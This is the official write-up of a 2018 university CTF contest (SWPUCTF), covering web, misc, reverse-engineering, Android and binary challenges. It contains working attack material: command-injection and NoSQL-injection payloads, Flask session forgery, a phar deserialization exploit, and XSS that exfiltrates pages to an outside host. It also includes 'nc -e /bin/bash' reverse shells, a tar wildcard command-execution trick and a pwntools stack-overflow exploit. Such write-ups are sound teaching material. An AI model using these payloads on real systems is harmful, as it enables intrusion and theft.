# 第九届SWPUCTF官方writeup

阅读量 **656536**

|评论 **2**

发布时间 : 2018-12-20 15:34:56

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01df4742de36947342.gif)

平台地址：<https://swpuctf.club>

感谢各位师傅能在工作上课之余抽出时间来玩，我们也希望这次比赛各位师傅玩得开心，但可能由于我们水平有限，资金支持有限，不能给各位师傅最好的体验，打比赛不易，办比赛也不易，希望各位师傅多多谅解

## WEB

###  用优惠码 买个 X ?

这道题难度不大(从各位师傅的做题速度就可以看出来 笑哭~)

但还是给有需要的师傅说一下我的思路

####  第一个random.php页面 php伪随机数

初始时给一个15位的优惠码 但需要你输入24位的优惠码才行

通过对目录扫描 发现www.zip 这里存在生成优惠码的源码和第二个页面的源码

通过现有优惠码和对源码进行反推 获得生成的随机数 然后拿着这些随机数进行种子爆破

可以使用php_mt_seed这款工具进行爆破 但是需要一定的格式 我附上我写的代码

    
    
    <?php
    $str = 'MiFgJ3paOh6LjrY';
    $randstr = 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $len=15;
    for($i=0;$i<$len;$i++){
            if($i<=($len/2)){
                    $pos = strpos($randstr,$str[$i]);
                    echo $pos." ".$pos." "."0 ".(strlen($randstr)-1)." ";
            }
            else{
                    $pos = strpos($randstr,$str[$i],-0);
                                    echo (strlen($randstr))-$pos;
                                    echo " ";
                                    echo (strlen($randstr))-$pos;
                                    echo " ";
                                    echo "0 ";
                                    echo (strlen($randstr)-1);
                                    echo " ";
            }
    }
    echo "n";
    ?>
    

再用php_mt_seed爆破:

`./share/php_mt_seed-4.0/php_mt_seed `php create_seed.php` `

我电脑大概10多秒就爆出来了

然后再改下我的源码 把 len改成24 再手动播种 即可获得24位的优惠码

> **注意:** 这里有坑点的 有些师傅不慎就踩进去了(笑哭~) php版本不同，同一种子生成的随机数序列不一样，  
>  就算是php7.0和php7.2都有区别 我的php版本是7.2.9-1(从响应包中能看见)

所以用php7.2的执行生成优惠码的php脚本 就能获取到优惠码

####  然后进入到第二个页面-绕过

第一层绕过是因为m修饰符

**php官方的解释:**

> 当这个修饰符设置之后，“行首”和“行末”就会匹配目标字符串中任意换行符之前或之后，另外， 还分别匹配目标字符串的最开始和最末尾位置。这等同于 perl
> 的 /m 修饰符。如果目标字符串 中没有 “n” 字符，或者模式中没有出现 ^ 或 $，设置这个修饰符不产生任何影响。

也就是说 ^和$会匹配 字符串中n之前和之后，也会匹配整个字符串的开始和结尾，但是只要匹配到一个就会返回正确

所以可以通过%0a来绕过

下一层绕过 就简单了

要想读到/flag中的内容 但是flag字符串也被过滤了  
可以以通过 f’la’g 或f[l][a]g等来绕过

最终payload就类似于 127.0.0.1%0ac’a’t /f’la’g

至此,结束

###  injection ???

如题，这是一道注入题，但并没有说这是`sql注入题`，比赛过程中看了下日志，不少师傅一来就先入为主了，各种sql注入的payload，题本身没啥难度，只要发现这是`Nosql注入`，就很简单了，其次就是验证码的问题，这个可以用python3的pytesseract库识别，当然也可以手工注入，这一点有些影响各位师傅的做题体验(
~~已被队友暴打~~ )

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.21.20.10-Screenshot%20from%202018-12-19%2021-19-41.png)

题目很简单就一个页面，登录框，F12查看页面源码：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.21.27.35-Screenshot%20from%202018-12-19%2021-27-10.png)

被注释了一行tips：

    
    
    <!-- tips:info.php -->
    

访问`info.php`是一个phpinfo页面，仔细观察重点在phpinfo里的扩展：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.21.30.30-Screenshot%20from%202018-12-19%2021-30-08.png)

很直观，php开启了mongo扩展，大胆猜测是mongodb注入，尝试构造payload:

    
    
    http://123.206.213.66:45678/check.php?username[$ne]=xxx&password[$ne]=xxx&vertify=xxxx
    

返回提示`Nice!But it is not the real
passwd`，可以确定就是nosql注入了，那就很好办了，拿到正确密码，这里可以通过mongodb的条件操作符`$regex`来用正则匹配达到类似sql盲注逐字符猜解的效果，最终payload:

    
    
    http://123.206.213.66:45678/check.php?username[$ne]=xxx&password[$regex]=^xxx&vertify=xxxx
    

以下是`4uuu Nya`师傅的脚本

    
    
    import pytesseract
    from PIL import Image
    import requests
    import os
    import string
    
    password = ''
    string_list = string.ascii_letters + string.digits
    
    s = requests.Session()
    
    for i in range(32):
        for j in string_list:
            res = s.get('http://123.206.213.66:45678/vertify.php')
            image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg')
            with open(image_name, 'wb') as file:
                file.write(res.content)
            image = Image.open(image_name)
            code = pytesseract.image_to_string(image)
            res = s.get('http://123.206.213.66:45678/check.php?username=admin&password[$regex]=^'+password + j +'&vertify='+code)
            while ('CAPTCHA' in res.content):
                res = s.get('http://123.206.213.66:45678/vertify.php')
                image_name = os.path.join(os.path.dirname(__file__),'yzm.jpg')
                with open(image_name, 'wb') as file:
                    file.write(res.content)
                image = Image.open(image_name)
                code = pytesseract.image_to_string(image)
                res = s.get('http://123.206.213.66:45678/check.php?username=admin&password[$regex]=^'+password + j +'&vertify='+code)
            print password+j,res.content
            if 'Nice!But it is not the real passwd' in res.content:
                password += j
                print password
                break
            elif 'username or password incorrect' in res.content:
                continue
    print passwd
    

###  皇家线上赌场

查看首页源码，可以看到 `/static?file=test.js` 和 `/source`：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.35.27-02.png)

访问 `/source` ，可以看到项目结构，和一段python源码，从目录结构推测出是flask，并且题目应该是读源码：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.36.21-03.png)

而正好前面还有一个 `/static?file=` 的路由，因此得出应该从这里来读取文件，再看 `/source` 中的代码，

    
    
    filename = request.args.get('file', 'test.js')
    if filename.find('..') != -1:
        return abort(403)
    filename = os.path.join('app/static', filename)
    

以及tip给的

    
    
    if filename != '/home/ctf/web/app/static/test.js' and filename.find('/home/ctf/web/app') != -1:
        return abort(404)
    

不能使用 .. 并且会把文件名拼接到 `app/static` 后面，

这里利用到 `os.path.join` 函数的一个特性，

参数中的绝对路径参数前面的所有参数会被忽略，看例子：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.36.42-04.png)

通过maps文件 `/proc/self/maps` 看到web路径

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.36.51-06.png)

尝试读取源码 `/home/ctf/web_assli3fasdf/app/views.py`
，报404，这里有点脑洞，我把路径转换成了绝对路径并做了一个过滤，禁止直接访问文件，因此需要进行绕过，这里用到了 `/proc/self/cwd`
目录，这个目录指向了当前进程的工作路径，而我在前面给了一个 `os.path.join('app/static', filename)`
，由此可知当前路径就是源码所在目录，因此构造访问 `/static?file=/proc/self/cwd/app/views.py` ，成功读到文件：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.37.01-07.png)

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.37.08-08.png)

在 **init**.py 中发现密钥，结合泄露出来的代码，那就是伪造session了，将 username 改为 admin，这样我的账号信息就会成为
admin ，每次请求就会把 admin 的账户余额读出来，然后去购买页面随意买一个东西，余额就会刷新

chg_session.py :

    
    
    from flask.sessions import SecureCookieSessionInterface
    
    class App(object):
        secret_key = '9f516783b42730b7888008dd5c15fe66'
    
    s = SecureCookieSessionInterface().get_signing_serializer(App())
    u = s.loads('eyJjc3JmX3Rva2VuIjoiMzgyMWRlNmFlMTRmNjc2NjU0YWNhMjZjYTQ1MzY4Y2Y3NjI2MzI1NSJ9.XBpHyw.9S0EAg9_yQKg7D3xqPp08eMIeH8')
    u['username'] = 'admin'
    print(s.dumps(u))
    

成功变身为admin

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.39.17-10.png)

点击admin处，出现获取flag的按钮，点击弹框显示一段json数据

用burp抓包，可以看到filed字段为username，读一下前面获取的源码可知，这是python的format函数的问题，而且在
`before_request` 函数中有个 `g.flag = xxxxxxxxx` ，那就是需要通过format将flag读取出来

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.39.23-12.png)

这里有两种方法，我本意是通过对flask的了解，进行跳转，最终读取到flag变量，但是还有一种万能解法，就是写脚本进行遍历，直到找到flag变量。这里我只说一下第一种，第二种我就不写脚本了，有兴趣可以写一下，在沙盒逃逸也可以用。

从前面读到的 `__init__.py` 文件可以清楚地知道使用了flask_sqlalchemy

首先看一下flask源码：

`flask/__init__.py`

    
    
    from .app import Flask, Request, Response
    from .config import Config
    from .helpers import url_for, flash, send_file, send_from_directory, 
         get_flashed_messages, get_template_attribute, make_response, safe_join, 
         stream_with_context
    from .globals import current_app, g, request, session, _request_ctx_stack, 
         _app_ctx_stack
    

`flask_sqlalchemy/__init__.py`

    
    
    from flask import _app_ctx_stack, abort, current_app, request
    

可以看到app、g、current_app在同一个空间下面，而current_app和SQLAlchemy在同一空间中，因此只要读到current_app变量，那么g变量也就读到了。

再来看一下`__init__.py`的源码：

    
    
    from .models import db
    
    
    def create_app():
        app = Flask(__name__, static_folder='')
        app.secret_key = 'anUEALvo7fV3KdwwiEYd'
        app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///test.db'
        register_views(app)
        db.init_app(app)
        return app
    

可以看到db变量，这是一个SQLAlchemy的实例，format中传入的第二个变量u是User的实例，我们可以通过u的一个方法访问models.py这个空间的db变量，这里我给了一个提示
“save方法”，那是因为User类没有定义`__init__`方法，而是继承自`db.Model`，因此不能访问到db变量。看到这里就很清晰了，构造出
`field=save.__globals__[db].__init__.__globals__.current_app.route.__globals__[g].flag`
即可打出flag
（这里的payload有很多，可以根据源码来构造比如使用BaseQuery也可以：`field=query.get_or_404.__globals__[current_app].route.__globals__[g].flag`）

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.39.52-14.png)

###  SimplePHP

题目地址：<http://120.79.158.180:11115/index.php>

这道题的主要考察点是：

  * 今年8月份爆出的：[利用phar拓展php反序列化攻击面](https://paper.seebug.org/680/)。
  * pop链的构造

###  题目描述

题目页面如下:

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.33.38-aaaa.png)

经过测试得知，网站具有如下两个功能：

  * upload_file.php处`上传文件`
  * file.php处`查看文件源码`

文件上传位置在：`upload_file.php`

查看相关源码在: `file.php`

####  题目主要代码

file.php

    
    
    <?php
    header("content-type:text/html;charset=utf-8"); 
    include 'function.php';
    include 'class.php';
    
    $file = $_GET["file"] ? $_GET['file'] : "";
    if(empty($file)) {
        echo "<h2>There is no file to show!<h2/>";
    }
    $show = new Show();
    if(file_exists($file)) {
        $show->source = $file;
        $show->_show();
    } else if (!empty($file)){
        die('file doesn't exists.');
    }
    ?>
    

function.php

    
    
    <?php
    //show_source(__FILE__);
    include "base.php";
    header("Content-type: text/html;charset=utf-8");
    error_reporting(E_ERROR | E_PARSE);
    foreach (array('_COOKIE','_POST','_GET') as $_request)  
    {  
        foreach ($$_request as $_key=>$_value)  
        {   
            $$_key=  addslashes($_value);
        }  
    }
    function upload_file_do() {
        global $_FILES;
        $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg";
        //mkdir("upload",0777);
        if(file_exists("upload/" . $filename)) {
            unlink($filename);
        }
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
        echo '<script type="text/javascript">alert("上传成功!");</script>';
    }
    function upload_file() {
        global $_FILES;
        if(upload_file_check()) {
            upload_file_do();
        }
    }
    function upload_file_check() {
        global $_FILES;
        $allowed_types = array("gif","jepg","jpg","png");
        $temp = explode(".",$_FILES["file"]["name"]);
        $extension = end($temp);
        if(empty($extension)) {
            //echo "<h4>请选择上传的文件:" . "<h4/>";
        }
        else{
            if(in_array($extension,$allowed_types)) {
                return true;
            }
            else {
                echo '<script type="text/javascript">alert("Invild file!");</script>';
                return false;
            }
        }
    }
    ?>
    

class.php

    
    
    <?php
    class C1e4r
    {
        public $test;
        public $str;
        public function __construct($name)
        {
            $this->str = $name;
        }
        public function __destruct()
        {
            $this->test = $this->str;
            echo $this->test;
        }
    }
    
    class Show
    {
        public $source;
        public $str;
        public function __construct($file)
        {
            $this->source = $file;
            echo $this->source;
        }
        public function __toString()
        {
            $content = $this->str['str']->source;
            return $content;
        }
        public function __set($key,$value)
        {
            $this->$key = $value;
        }
        public function _show()
        {
            if(preg_match('/http|https|file:|gopher|dict|..|f1ag/i',$this->source)) {
                die('hacker!');
            } else {
                highlight_file($this->source);
            }
    
        }
        public function __wakeup()
        {
            if(preg_match("/http|https|file:|gopher|dict|../i", $this->source)) {
                echo "hacker~";
                $this->source = "index.php";
            }
        }
    }
    class Test
    {
        public $file;
        public $params;
        public function __construct()
        {
            $this->params = array();
        }
        public function __get($key)
        {
            return $this->get($key);
        }
        public function get($key)
        {
            if(isset($this->params[$key])) {
                $value = $this->params[$key];
            } else {
                $value = "index.php";
            }
            return $this->file_get($value);
        }
        public function file_get($value)
        {
            $text = base64_encode(file_get_contents($value));
            return $text;
        }
    }
    ?>
    

####  分析

按照base.php的提示,flag就在`f1ag.php`中，那么就要想法通过读取f1ag.php文件来获取flag。

而整个代码中只有两个函数可以获取文件的内容： **class.php**
中的`highlight_file()`和`file_get_contents()`

但是在代码中又做了如下限制：

  * 题目在上传文件处做了白名单的限制,无法上传可被解析的php文件。所以直接上传webshell后查看文件的这条路便走不通
  * `_show`方法把f1agWAF掉，无法显示flag所在的f1ag.php文件

所以最后只有从`file_get_contents()`函数入手。

因为又没有`serialize()`和`unserialize()`函数，所以就没有办法直接触发`file_get_contents()`所在的`Test`类，那么就只有通过其他方法来调用`Test`。

结合文件上传的功能点，我们不难想到用上传phar包来触发反序列化漏洞。

在phar触发反序列化漏洞有一下要求:

  * 存在文件操作函数,例如`file_exits()`、`file_get_contents()`等等， **且其中的参数可控**
  * 在类中存在`__destruct`方法
  * 可上传phar构造文件

而我们题目正好符合这以上几点要求:

file.php中存在`file_exits()`,且`$file`可控

    
    
    <?php
    //code...
    $show = new Show();
    if(file_exists($file)) {
        $show->source = $file;
        $show->_show();
    } 
    //code...
    ?>
    

class.php中存在`__destruct()`方法

    
    
    class C1e4r
    {
        //code...
        public function __destruct()
        {
            $this->test = $this->str;
            echo $this->test;
        }
    }
    

function.php中存在`文件上传`

    
    
    function upload_file_do() {
        global $_FILES;
        $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg";
        //mkdir("upload",0777);
        if(file_exists("upload/" . $filename)) {
            unlink($filename);
        }
        move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
        echo '<script type="text/javascript">alert("上传成功!");</script>';
    }
    

3个条件已经满足，那么接下来就是需要构造pop链了

###  pop链分析

1.`file_get_contents()`存在`Test`类中的`file_get()`方法,该方法在`get`中被调用,而`get`是`__get`魔法方法的重写。

    
    
    public function __get($key)
        {
            return $this->get($key);
        }
        public function get($key)
        {
            if(isset($this->params[$key])) {
                $value = $this->params[$key];
            } else {
                $value = "index.php";
            }
            return $this->file_get($value);
        }
        public function file_get($value)
        {
            $text = base64_encode(file_get_contents($value));
            return $text;
        }
    

`__get`方法是在访问一个类不存在或者是不可访问的变量是会触发。下一步就是要想办法触发`__get`

2.在`Show`类的`__toString`魔术方法中

    
    
    public function __toString()
        {
            $content = $this->str['str']->source;
            return $content;
        }
    

存在`$this->str['str']->source`,如果`$this->str['str']`为`Test`类的话，那么就会访问不存在的`source`变量，这里就可以调用`__get`方法。接下来就是要触发`__toString`方法(当一个对象被当做字符串时调用)

3.而恰好在`C1e4r`的`__destruct`中echo了一个变量,`__toSting`方法就可以用上

    
    
    public function __destruct()
        {
            $this->test = $this->str;
            echo $this->test;
        }
    

至此，我们的pop链就形成了。

###  exp构造

    
    
    <?php
    class C1e4r
    {
        public $test;
        public $str;
    }
    class Show
    {
        public $source;
        public $str;
    }
    class Test
    {
        public $file;
        public $params = array('source' => 'var/www/html/f1ag.php');
    }
    
        @unlink("c1e4r.phar");
        $phar = new Phar("c1e4r.phar");
        $phar->startBuffering();
        $phar->setStub("GIF89a"."<?php __HALT_COMPILER(); ?>");
        $p1 = new C1e4r();
        $p2 = new Show();
        $p2->str = array('str'=>new Test());
        $p1->str = $p2;
    
        $phar->setMetadata($p1); 
        var_dump($phar->getMetadata());
        $phar->addFromString("test.txt", "c1e4r"); 
        //签名自动计算
        $phar->stopBuffering();
    ?>
    

上传后保存的文件名是

`$filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg";`

ip在题目页面右上角有显示。

上传成功后,访问:

`file.php?file=phar://upload/文件名`,base64解码后获得flag

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.34.05-flaasad.png)

    
    
    <?php
        $flag = 'SWPUCTF{Php_un$eri4liz3_1s_Fu^!}';
    ?>
    

###  有趣的邮箱注册

check.php右键发现源码有php

    
    
    <!--check.php
    if($_POST['email']) {
    $email = $_POST['email'];
    if(!filter_var($email,FILTER_VALIDATE_EMAIL)){
    echo "error email, please check your email";
    }else{
    echo "等待管理员自动审核";
    echo $email;
    }
    }
    ?>
    

于是提交payload

    
    
    "aaa><script/src=http://sp4rk.cn:6324/duyuanma.js</script>"@a.aaa
    
    
    
    var a = new XMLHttpRequest();
    a.open('GET', 'http://localhost:6324/admin/admin.php', false);
    a.send(null);
    b = a.responseText;
    location.href = 'http://t15em7.ceye.io/d' + escape(b);
    

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fyd0j3llkbj31uk0be40p.jpg)

可以看到admin/a0a.php下面有个命令执行，于是弹shell

    
    
    var a = new XMLHttpRequest();
    a.open('GET', 'http://localhost:6324/admin/a0a.php?cmd=nc+-e+%2fbin%2fbash+118.89.56.208+6325', false);
    a.send(null);
    b = a.responseText;
    location.href = 'http://t15em7.ceye.io/' + escape(b);
    

![](https://ws4.sinaimg.cn/large/006tNbRwgy1fyd0j7dqquj327g0m4dhw.jpg)

![](https://ws2.sinaimg.cn/large/006tNbRwgy1fyd0jakxl5j310i0dy76b.jpg)

![](https://ws4.sinaimg.cn/large/006tNbRwgy1fyd0jdddhuj30r40ea75e.jpg)

上层的根目录有个4f0a5ead5aef34138fcbf8cf00029e7b，访问下

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fyd0jgouibj326w0mcgnu.jpg)

这里有个上传和备份文件

![](https://ws1.sinaimg.cn/large/006tNbRwgy1fyd0jjo2v8j30su0kajui.jpg)

发现经过tar *处理，于是上传文件

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fyd0jn9kgkj31hc0pmdiw.jpg)

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fyd12gwajpj31hw0h4407.jpg)

—checkpoint=1

—checkpoint-action=exec=sh exp.sh

exp.sh

    
    
    nc -e /bin/bash 118.89.56.208 6325
    

![](https://ws3.sinaimg.cn/large/006tNbRwgy1fyd0jr3aj4j30zm0a0wgi.jpg)

## MISC

###  签到题

1、一般思路，拖到winhex看看源码，ctrl+f，然后flag，回车，在末尾发现有一半flag

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.30.55-100582575.jpg)

2、图片长宽被改过后在linux里面用display是查看不了的，会报错

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.30.21-705011104.jpg)

所以修改高度，在底部可以看到另一半flag

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.31.33-1676609011.jpg)

修改这个位置，这里修改为02ff

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.31.17-886232469.jpg)

看到另一半flag

###  唯有低头，才能出头

提示：举头望明月，低头…

意思就是看键盘….

打开记事本,有一串数字`99 9 9 88 11 5 5 66 3 88 3 6 555 9 11 4 33`

99对应的是`l`

9对应`o` 依次类推,

最后获得`swpuctf{lookatthekeyboard}`

###  流量签到题

简单的流量题

用Wireshark打开流量包,查找flag

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.13.42.42-fghfgh.png)

## RE

解密代码都放云盘：  
链接：<https://pan.baidu.com/s/1vP86jBhLsQRJGCRJtyEKzw>  
提取码：tqiz

###  RE1

原理很简单：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.17.01-image.png)

这个开始想法是想写压缩，后来改成了加密，原理就是把开始和结尾的0全部去掉，如果开始有重复的1就删掉只剩下一个1(因为sar指令高位不变，所以留一个1来还原重复的1)。然后用这几个表来保存一下进行操作的位数，这些表都是bit进行拼接形成，还原时候分别用shr,shl,sar就行了。

###  RE2

这道题放了一些假的check函数来迷惑，流程是首先将存放wsprintf函数的返回地址处的堆栈地址作为了第一个参数，第三个参数就是要跳转的地址，这样调用wsprintf就会转到00401360处执行，这是以前在看雪看到的一个方法，具体文章链接没有保存。

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.17.38-image.png)

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.17.50-image.png)

到00401360看下：

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.18.06-image.png)

这里故意产生了一个异常，然后我在一个C++类的全局对象的构造函数去HOOK了KiUserExceptionDispatcher中的调用异常handler的call

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.18.34-image.png)

然后在hook函数中进行加密，并且将加密后的存放在了ExceptionInfo->ExceptionRecord->ExceptionInformation中，接着走一下VEH,SEH再进行一次加密，就是一个base64，然后在设置了下TopLevelExceptionFilter，将数据传递到各个寄存器，再设置eip返回到真正的check函数。

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.18.57-image.png)

check函数再通过push ret来返回到main的打印的地方。整个流程就是这样，算法很简单。

###  GOOD_GAME

这道题是用傀儡进程技术，没做太多处理，容易找到dump点，可以直接dump出来真正的exe文件。

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.19.30-image.png)

真正的exe是D3D绘制的界面，通过字符串[Enter]可以跟踪到获取输入以及返回上一层的地。

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.20.00-image.png)

这里用了’ – ’符来分割string，然后保存到vector中。并且判断vector中string的个数是否是4以及每一个string的长度是否是4.

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.20.16-image.png)

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.20.23-image.png)

接着传入前面两部分进行一次加密，可以根据常量识别出这是DES算法，这里把DES的subkeys进行了一次移位，并且修改了sbox3开头的5个字节，然后把结尾结果减去0x10，之后再进行一个简单的方程check。解方程可以得到另外两部分是个常量。

DES部分可以网上找个标准的DES把这几部分改一下就能解出FLAG：HOPE-UCAN-GOOD-GAME

###  Paper tiger

这道题算法很简单，主要是用了自己写的一个变形乱序引擎进行改变一下。这里可以对ShowWindow下断，回溯找到check点，这里可以先清除花指令(一共4种，很容易识别出来，都是固定字节)，这里转移指令没有用表进行加密而是直接放的jmp
xxx ,call xxx ,push xxx ret这三种类型，对于变形代码也只是处理了一些mov reg,常量 push xxx这些，不影响算法部分。

这里可以下内存访问断点单步跟出算法，原本的思路是想师傅们恢复一下乱序再适当恢复点变形，但是这样可能工作量过大，就没有对算法部分的指令进行变形，只是对验证算法的一条mov
ecx,5进行了变形，但是动态跟还是很容易看出来。

我这里的做法没有下访问断点跟，而是用OD脚本简单恢复了下乱序，然后定位关键代码去看看。

OD脚本去跑一下trace清除一下所有的nop和乱序指令，再对输入部分的长度和内容都下一个内存访问断点。

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-20.14.21.17-image.png)

可以来到这个地方，再到od
脚本跑的trace中去定位一下这个位置，就可以开始分析了，最后可以提取出整个算法。OD脚本和跑出来的trace以及分析的code和解密代码放在附件。

## MOBILE

###  基础android

先找到入口活动

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.01.29-android.png)

解压apk然后把dex文件放到jadx-gui里面，找到对应活动

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.02.23-android2.png)

可以看到这里有一个checkPassword()函数验证我们的输入

查看checkPassword()函数

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.03.11-android3.png)

先判断输入长度，然后再进行一个简单的循环，可以自己写一个脚本找到正确输入

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.03.40-4.png)

然后进入到第二个界面

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.04.14-asd.png)

可以看到这是把我们的输入作为广播发送出去，那么可以看到在AndroidManifest.xml文件里面注册了一个广播接收器

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.04.48-sdf.png)

这就是第二个输入，然后就可以看到带flag的图片了

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.05.25-fgh.png)

###  Android2.0

把dex文件放到jadx-gui里面

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.06.36-ghj.png)

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.07.27-4452.png)

可以看到将我们的输入作为参数调用jni方法，如果返回1就正确，返回0则失败

那么把so文件放到IDA中，找到相关函数

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.08.33-6782.png)

查看First()函数

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.09.07-992.png)

自己写一个脚本解码

![](https://raw.githubusercontent.com/c1h3ng/BLOG_IMG/master/img/2018-12-19.22.10.38-345.png)

就可以解出flag了

## BIN

###  easy_exp

一个格式化字符串，一个栈溢出。

先用格式化泄漏出 libc 基地址和 heap 栈地址。通过 libc 获得一个 one_gadget，通过 heap 获得目标地址。

然后是 motto
处，先是输入长度时如果长度为负那么会对长度进行求补，-9223372036854775808的补数是本身，这样就可以实现输入一串很长的字符串造成栈溢出了。

然后这里还要绕过 Canary，我们这里用c++异常处理来绕过，直接触发异常，unwind 时是不检测 Canary 的，这样就绕过了Canary 了。

    
    
    from pwn import *
    
    # io = process("./exploit_1")
    io = remote("118.25.216.151", 10001)
    elf = ELF("./exploit_1", checksec=False)
    libc = ELF("./libc.so.6", checksec=False)
    
    puts_got    = elf.got["puts"]
    puts_plt    = elf.plt["puts"]
    read_plt    = elf.plt["read"]
    read_addr   = 0x400BF5
    
    rdi_ret     = 0x400fa3
    rsi_r15_ret = 0x400fa1
    
    # context.log_level = "debug"
    
    # -------- leak info --------    io.recvuntil("please input name:n")
    io.send("%p/%p/%p/%p/%p/%p/!%p/n")
    
    io.recvuntil("/")
    libc_base = int(io.recvuntil("/")[:-1], 16) - 0x3C6780
    io.recvuntil("/!")
    heap_base = int(io.recvuntil("/")[:-1], 16)
    info("libc base: " + hex(libc_base))
    info("heap base: " + hex(heap_base))
    
    # -------- exploit --------    one_gadget = libc_base + 0x45216
    info("one_gadget: " + hex(one_gadget))
    pivote_addr = heap_base + 0x20
    info("pivote addr: " + hex(pivote_addr))
    unwind_addr = 0x400EC5
    
    payload  = "aaaaaaaa"
    payload += p64(one_gadget)
    payload  = payload.ljust(0x410, 'x00')
    
    io.recvuntil("please input size of motto:n")
    io.sendline("-9223372036854775808")
    io.recvuntil("please input motto:n")
    io.send(payload + p64(pivote_addr) + p64(unwind_addr))
    io.send("n")
    
    io.interactive()
    io.close()
    

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **寒江** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/168338](/post/id/168338)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Android](/tag/Android)
  * [CTF](/tag/CTF)
  * [Web](/tag/Web)
  * [RE](/tag/RE)

 **+1** __18赞

 __收藏

![](https://thirdwx.qlogo.cn/mmopen/vi_32/Q0j4TwGTfTIGDumd2Fd9bEIY3guwxHl7E8y3eFUp9JtzEoWpHrgu5lmFSwVdbUlBEEmN4PJo4uTVTzo24hWibGw/132)
寒江

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

